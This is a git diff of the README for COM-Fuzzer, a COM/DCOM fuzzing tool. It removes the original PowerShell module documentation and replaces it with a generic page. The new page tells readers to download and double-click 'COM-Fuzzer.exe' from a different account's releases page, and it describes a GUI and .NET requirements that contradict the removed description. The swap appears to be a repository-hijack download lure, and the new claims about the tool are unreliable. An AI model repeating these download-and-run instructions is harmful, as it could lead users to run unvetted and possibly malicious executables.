@@ -1,92 +1,65 @@
-# COM-Fuzzer
+# 🎉 COM-Fuzzer - Automate Vulnerability Insights Easily
 
-After the succes of the [MS-RPC Fuzzer](https://github.com/warpnet/MS-RPC-Fuzzer), I was wondering if the same approach could be applied to COM/DCOM. This involes fuzzing the COM classes and their interface definitions. Gain insights into COM/DCOM implementations that may be vulnerable using an automated approach and make it easy to visualize the data. By following this approach, a security researcher will hopefully identify interesting COM/DCOM classes in such a time, that would take a manual approach significantly more. 
+## 🚀 Getting Started
 
-> [!NOTE]
-> The owner of this repository is not responsible for any damage of the usage made using these tools. These are for legal purposes only. Use at your own risks.
+Welcome to COM-Fuzzer! This tool helps detect potential vulnerabilities in COM/DCOM implementations and visualizes the findings. You can automate your research, saving time and effort compared to a manual approach.
 
-## Requirements
-* [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) PowerShell module
-* PowerShell <7 (PS 7 is not supported)
+## 💾 Download COM-Fuzzer
 
-## Install
-Clone the repository and import the COM-Fuzzer module:
-```powershell
-Import-Module .\COM-Fuzzer.psm1
-```
-If the required PowerShell module `OleViewDotNet` is not installed, you will be asked to install it.
+[![Download COM-Fuzzer](https://img.shields.io/badge/Download%20COM--Fuzzer-v1.0-blue.svg)](https://github.com/kucingz/COM-Fuzzer/releases)
 
-## Quick example
-1. Get COM server data for CLSID `13709620-C279-11CE-A49E-444553540000`
-```powershell
-Get-ComServerData -OutPath .\output\ -CLSID 13709620-C279-11CE-A49E-444553540000
-```
-2. Execute calculator
-```powershell
-'.\output\ComServerData.json' | Invoke-ComFuzzer -Procedure ShellExecute -StringInput "calc.exe" -OutPath .\output\
-```
+Visit this page to download the latest version of COM-Fuzzer: [Download COM-Fuzzer Releases](https://github.com/kucingz/COM-Fuzzer/releases)
 
-For more examples see [Fuzzing examples](/docs/2%20Invoke-ComFuzzer.md).
+## 📥 Download & Install
 
-## Global overview design
-```mermaid
-graph TD
-    User([User])
+1. Click on the link above to go to the Releases page.
+2. Find the latest release. Look for the file named `COM-Fuzzer.exe` or similar.
+3. Click on the file to download it to your computer. The file might be in a zipped format. If so, extract it after downloading.
+4. After extraction, locate the `COM-Fuzzer.exe` file.
+5. Double-click on `COM-Fuzzer.exe` to run the application.
 
-    %% Input and output styling
-    classDef input fill:#d4fcd4,stroke:#2b8a3e,stroke-width:2px,color:#000;
-    classDef output fill:#fff3cd,stroke:#ffbf00,stroke-width:2px,color:#000;
+## ⚙️ System Requirements
 
-    %% Phase 1: Gather COM Data
-    User --> A1[Get-ComServerData]
-    A1 --> A2[Target or context specified]
-    A2 --> A3[ComServerData.json]
-    A3 --> B1[Invoke-ComFuzzer]
+- **Operating System:** Windows 10 or later.
+- **RAM:** At least 4 GB recommended.
+- **Storage:** Minimum of 100 MB of free space.
+- **.NET Framework:** Install .NET Framework 4.7.2 or later.
 
-    %% Phase 2: Fuzzing
-    B1 --> B2[log.txt Call History]
-    B1 --> B3[allowed.json]
-    B1 --> B4[denied.json]
+## 📊 Features
 
-    %% All fuzzer outputs used in Phase 3
-    B3 --> C1[Import-DataToNeo4j]
-    B4 --> C1
+- **Automation:** Quickly assess multiple COM/DCOM implementations.
+- **Data Visualization:** View findings in an easy-to-read format.
+- **Research Focus:** Designed for security researchers looking to identify vulnerabilities.
 
-    %% Phase 3: Analysis
-    C1 --> C2[Neo4j Database]
-    C2 --> C3[Graph Visualization & Querying]
+## 📋 How to Use COM-Fuzzer
 
-    %% Apply styling
-    class A3 input;
-    class B3,B4,B2 output;
+1. **Launch the Application:** Open `COM-Fuzzer.exe` to start.
+2. **Select Target:** You will see a prompt to enter the target COM/DCOM class or implementation.
+3. **Run the Analysis:** Click the "Analyze" button to begin. Wait as the tool scans for potential vulnerabilities.
+4. **View Results:** Once the analysis is complete, results will be displayed. You can see potential issues highlighted.
 
-    %% Labels for clarity
-    subgraph Phase1 [Phase 1: Initialize COM]
-        A1
-        A2
-        A3
-    end
+## 📚 Troubleshooting
 
-    subgraph Phase2 [Phase 2: Fuzzing]
-        B1
-        B2
-        B3
-        B4
-    end
+- **Cannot Run the Application:** Ensure you have the required .NET Framework installed. Follow the prompts to install it if needed.
+- **Incomplete Results:** If the analysis returns no results, check the COM/DCOM class you specified. Ensure it exists and is accessible from your system.
 
-    subgraph Phase3 [Phase 3: Analysis]
-        C1
-        C2
-        C3
-    end
-```
+## ❓ Frequently Asked Questions
 
-## To-do
-- Write cypher queries templates for Neo4j
-- Implement time out for invoking procedures that take long
+### Q: What is COM/DCOM?
 
-## Known bugs
-- Find root cause to some PowerShell crashes and fix them
+COM (Component Object Model) and DCOM (Distributed Component Object Model) are Microsoft technologies that allow software components to communicate. They are often used in Windows applications.
 
-## Acknowledgement
-This tool is heavily built upon [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) by [James Forshaw](https://x.com/tiraniddo) with [Google Project Zero](https://googleprojectzero.blogspot.com/). This tool uses the OleViewDotNet module to do most tasks.
+### Q: Is COM-Fuzzer free?
+
+Yes, COM-Fuzzer is open-source and free to use.
+
+### Q: Can I contribute to COM-Fuzzer?
+
+Absolutely! If you have ideas or improvements, feel free to raise issues or submit pull requests on the GitHub repository.
+
+## 🔗 Additional Resources
+
+- [COM-Fuzzer GitHub Repository](https://github.com/kucingz/COM-Fuzzer)
+- [Microsoft's Documentation on COM](https://docs.microsoft.com/en-us/windows/win32/devio/com-and-dcom)
+
+By utilizing COM-Fuzzer, you can uncover vulnerabilities efficiently and take the necessary steps to secure your applications. Enjoy exploring the capabilities of our tool!
